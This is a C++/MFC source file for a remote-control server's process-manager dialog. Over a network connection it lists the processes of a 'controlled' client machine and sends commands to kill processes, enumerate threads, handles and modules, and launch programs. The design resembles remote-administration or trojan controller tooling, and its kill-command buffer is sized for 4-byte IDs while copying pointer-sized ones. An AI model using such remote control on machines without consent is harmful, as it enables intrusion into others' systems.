// DlgProcessManager.cpp : 实现文件

#include "stdafx.h"
#include "Server.h"
#include "DlgProcessManager.h"
#include "afxdialogex.h"

#include "DlgRemoteOpenProcess.h"
extern char __ProcessName[MAX_PATH];
// CDlgProcessManager 对话框

IMPLEMENT_DYNAMIC(CDlgProcessManager, CDialog)

CDlgProcessManager::CDlgProcessManager(CWnd* pParent, _CIOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_PROCESS_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

	m_BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0));  //被控端传回的数据
	//m_bMethod = BufferData[0];
}

CDlgProcessManager::~CDlgProcessManager()
{
}

void CDlgProcessManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_PROCESS_MANAGER_SHOW, m_CListCtrl_Dialog_Process_Manager_Show);
}

BEGIN_MESSAGE_MAP(CDlgProcessManager, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_LIST_PROCESS_MANAGER_SHOW, &CDlgProcessManager::OnNMCustomdrawListProcessManagerShow)
	ON_COMMAND(ID_BUTTON_MENU_PROCESS_MANAGER_LIST_REFRESH, &CDlgProcessManager::OnButtonMenuProcessManagerListRefresh)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS_MANAGER_SHOW, &CDlgProcessManager::OnNMRClickListProcessManagerShow)
	ON_COMMAND(ID_BUTTON_MENU_PROCESS_MANAGER_KILL_ONE, &CDlgProcessManager::OnButtonMenuProcessManagerKillOne)
	ON_COMMAND(ID_BUTTON_MENU_PROCESS_MANAGER_ENUM_THREADER, &CDlgProcessManager::OnButtonMenuProcessManagerEnumThreader)
	ON_COMMAND(ID_BUTTON_MENU_PROCESS_MANAGER_ENUM_HANDLE, &CDlgProcessManager::OnButtonMenuProcessManagerEnumHandle)
	ON_COMMAND(ID_BUTTON_MENU_PROCESS_MANAGER_ENUM_MODULE, &CDlgProcessManager::OnButtonMenuProcessManagerEnumModule)
	ON_COMMAND(ID_BUTTON_MENU_PROCESS_MANAGER_OPEN_PROCESS, &CDlgProcessManager::OnButtonMenuProcessManagerOpenProcess)

	ON_MESSAGE(UM_OPEN_REMOTE_OPEN_PROCESS_DIALOG, OnRemoteOpenProcessDialog)



END_MESSAGE_MAP()

// CDlgProcessManager 消息处理程序
void CDlgProcessManager::WindowHandleIO()
{
	if (m_ContextObject ==NULL)
	{
		return;
	}

	switch (m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0)[0])
	{
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		ShowProcessList();
		break;
	}
	case CLIENT_PROCESS_MANAGER_KILL_ONE_REPLY:
	{
		OnButtonMenuProcessManagerListRefresh();
		break;
	}
	case CLIENT_REMOTE_OPEN_PROCESS_REPLY:
	{
		BOOL* IsOk = (BOOL*)m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1);
		if (*IsOk)
		{
			MessageBox("打开成功");
		}
		else
		{
			MessageBox("打开失败");
		}
		break;
	}

	
	}
}

BOOL CDlgProcessManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 获得客户端IP SetWindowText

	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\\\\%s - 远程进程管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);
	//设置对话框上的数据
	LOGFONT Logfont;
	CFont* v2 = m_CListCtrl_Dialog_Process_Manager_Show.GetFont();
	v2->GetLogFont(&Logfont);
	//调整比例
	Logfont.lfHeight = Logfont.lfHeight*1.3;
	Logfont.lfWeight = Logfont.lfWeight*1.3;
	CFont v3;
	v3.CreateFontIndirect(&Logfont);
	m_CListCtrl_Dialog_Process_Manager_Show.SetFont(&v3);
	v3.Detach();

	m_CListCtrl_Dialog_Process_Manager_Show.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	
	switch (m_BufferData[0])
	{
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(0, "PID", LVCFMT_LEFT, 60);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(1, "进程镜像", LVCFMT_LEFT, 150);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(2, "程序路径", LVCFMT_LEFT, 300);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(3, "程序位数", LVCFMT_LEFT, 120);
		ShowProcessList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中\0\0


		break;
	}
	default:
		break;
	}
	
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CDlgProcessManager::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		m_ContextObject->DialogHandle = NULL;
		m_ContextObject->DialogID = 0;
	}
	CDialog::OnClose();
	
}

void CDlgProcessManager::ShowProcessList()
{
	
	char *BufferData = (char *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));
	char *ProcessImageName = NULL;
	char *ProcessFullPath = NULL;
	char *IsWowProcess = NULL;
	DWORD	Offset = 0;
	CString	v1;
	m_CListCtrl_Dialog_Process_Manager_Show.DeleteAllItems();
	
	int i;
	for (i = 0; Offset <m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1; i++)
	{
		HANDLE* ProcessID = (HANDLE*)(BufferData + Offset);				   //进程ID
		ProcessImageName = (char *)BufferData + Offset + sizeof(HANDLE);   //进程名字 
		ProcessFullPath = ProcessImageName + lstrlen(ProcessImageName) + 1;//进程完整路径
		IsWowProcess = ProcessFullPath + lstrlen(ProcessFullPath) + 1;	   //进程位数

		
		v1.Format("%5u", *ProcessID);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertItem(i, v1);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 1, ProcessImageName);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 2, ProcessFullPath);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 3, IsWowProcess);
		
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemData(i, (DWORD_PTR)*ProcessID);  
		//跳过这个结构进入下一次循环
		Offset += sizeof(HANDLE) + lstrlen(ProcessImageName) + lstrlen(ProcessFullPath) 
			+ lstrlen(IsWowProcess) +3;
	}
	v1.Format("进程个数【%d】", i);   //修改CtrlList 
	LVCOLUMN v3;
	v3.mask = LVCF_TEXT;
	v3.pszText = v1.GetBuffer(0);
	v3.cchTextMax = v1.GetLength();
	m_CListCtrl_Dialog_Process_Manager_Show.SetColumn(3, &v3);

}

void CDlgProcessManager::OnNMCustomdrawListProcessManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVCUSTOMDRAW* pLVCD = reinterpret_cast<NMLVCUSTOMDRAW*>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = CDRF_DODEFAULT;
	if (CDDS_PREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYITEMDRAW;
	}
	else if (CDDS_ITEMPREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYSUBITEMDRAW;
	}
	else if ((CDDS_ITEMPREPAINT|CDDS_SUBITEM) == pLVCD->nmcd.dwDrawStage)
	{
		COLORREF newTextColor, newBackgroundColor;
		int Item = static_cast<int>(pLVCD->nmcd.dwItemSpec);
		CString ProcessImageName = m_CListCtrl_Dialog_Process_Manager_Show.GetItemText(Item, 1);
		if (strcmp((const CHAR*)ProcessImageName.GetBuffer(0),"explorer.exe") == 0)
		{
			newTextColor = RGB(0, 0, 0);
			newBackgroundColor = RGB(0, 255, 255);
		}
		else
		{
			newTextColor = RGB(0, 0, 0);
			newBackgroundColor = RGB(255, 255, 255);
		}
		pLVCD->clrText = newTextColor;
		pLVCD->clrTextBk = newBackgroundColor;
		*pResult = CDRF_DODEFAULT;
	}
}

void CDlgProcessManager::OnNMRClickListProcessManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_PROCESS_MANAGER_LIST_RINGHT);
	CMenu* SubMenu = Menu.GetSubMenu(0);
	//获得鼠标位置
	CPoint Point;
	GetCursorPos(&Point);
	SetForegroundWindow();
	SubMenu->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON, Point.x, Point.y, this, NULL);

	*pResult = 0;
}

void CDlgProcessManager::OnButtonMenuProcessManagerListRefresh()
{
	// 刷新进程列表
	BYTE IsToken = CLIENT_PROCESS_MANAGER_REFRESH;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, 1);
}

void CDlgProcessManager::OnButtonMenuProcessManagerKillOne()
{
	// TODO: 在此添加命令处理程序代码
	ClientProcessKill();
}

void CDlgProcessManager::ClientProcessKill()
{
	CListCtrl	*v1 = NULL;
	if (m_CListCtrl_Dialog_Process_Manager_Show.IsWindowVisible())
	{
		v1 = &m_CListCtrl_Dialog_Process_Manager_Show;
	}	
	else
	{
		return;
	}
	
	//[消息][ID][ID][ID][ID]
	//非配缓冲区
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + (v1->GetSelectedCount() * 4));//1.exe  4  ID   Handle
																				   //加入结束进程的数据头
	BufferData[0] = CLIENT_PROCESS_MANAGER_KILL_ONE;
	
	//显示警告信息
	char *WARNING = "警告: 终止进程会导致不希望发生的结果，\n"
					"包括数据丢失和系统不稳定。在被终止前，\n"
					"进程将没有机会保存其状态和数据。";
	CString v2;
	if (v1->GetSelectedCount() > 1)
	{
		v2.Format("%s确实\n想终止这%d项进程吗?", WARNING, v1->GetSelectedCount());
	}
	else
	{
		v2.Format("%s确实\n想终止该项进程吗?", WARNING);
	}
	if (::MessageBox(m_hWnd, v2, "进程结束警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	DWORD	Offset = 1;
	//获取第一个选定项的位置列表视图控件。
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	//得到要结束哪个进程
	//可以一下结束多个进程
	while (Pos)
	{
		int	iItem = v1->GetNextSelectedItem(Pos);
		DWORD ProcessID = v1->GetItemData(iItem);
		memcpy(BufferData + Offset, &ProcessID, sizeof(HANDLE));
		Offset += sizeof(HANDLE);
	}
	//发送数据到被控端在被控端中查找CLIENT_PROCESS_MANAGER_KILL_ONE这个数据头
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

void CDlgProcessManager::OnButtonMenuProcessManagerEnumThreader()
{
	// TODO: 在此添加命令处理程序代码
	CListCtrl	*v1 = NULL;
	v1 = &m_CListCtrl_Dialog_Process_Manager_Show;
	if (v1 == NULL)
	{
		MessageBox("没选上进程项目！");
		return;
	}
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	int	iItem = v1->GetNextSelectedItem(Pos);
	DWORD ProcessID = v1->GetItemData(iItem);
	if (ProcessID==NULL)
	{
		MessageBox("枚举线程ProcessID==NULL！");
		return;
	}
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + sizeof(HANDLE));
	BufferData[0]= CLIENT_PROCESS_MANAGER_ENUM_THREADER;
	memcpy(BufferData + 1, &ProcessID, sizeof(HANDLE));
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

void CDlgProcessManager::OnButtonMenuProcessManagerEnumHandle()
{
	// TODO: 在此添加命令处理程序代码
	CListCtrl	*v1 = NULL;
	v1 = &m_CListCtrl_Dialog_Process_Manager_Show;
	if (v1 == NULL)
	{
		MessageBox("没选上进程项目！");
		return;
	}
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	int	iItem = v1->GetNextSelectedItem(Pos);
	DWORD ProcessID = v1->GetItemData(iItem);
	if (ProcessID == NULL)
	{
		MessageBox("枚举句柄ProcessID==NULL！");
		return;
	}
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + sizeof(HANDLE));
	BufferData[0] = CLIENT_PROCESS_MANAGER_ENUM_HANDLE;
	memcpy(BufferData + 1, &ProcessID, sizeof(HANDLE));
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

void CDlgProcessManager::OnButtonMenuProcessManagerEnumModule()
{
	CListCtrl	*v1 = NULL;
	v1 = &m_CListCtrl_Dialog_Process_Manager_Show;
	if (v1 == NULL)
	{
		MessageBox("没选上进程项目！");
		return;
	}
	POSITION Pos = v1->GetFirstSelectedItemPosition();
	int	iItem = v1->GetNextSelectedItem(Pos);
	DWORD ProcessID = v1->GetItemData(iItem);
	if (ProcessID == NULL)
	{
		MessageBox("枚举句柄ProcessID==NULL！");
		return;
	}
	LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, 1 + sizeof(HANDLE));
	BufferData[0] = CLIENT_PROCESS_MANAGER_ENUM_MODULE;
	memcpy(BufferData + 1, &ProcessID, sizeof(HANDLE));
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
}

void CDlgProcessManager::OnButtonMenuProcessManagerOpenProcess()
{
	// TODO: 在此添加命令处理程序代码
	CDlgRemoteOpenProcess* Dialog = new CDlgRemoteOpenProcess((CWnd*)this->m_hWnd, m_IOCPServer);
	// 设置父窗口为桌面
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_WRITE_REMOTE_PROCESS_NAME, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	return;
}

LRESULT CDlgProcessManager::OnRemoteOpenProcessDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	m_IOCPServer->OnPrepareSending(m_ContextObject, (LPBYTE)ParamterData2, strlen((const char*)ParamterData2));

	return LRESULT();
}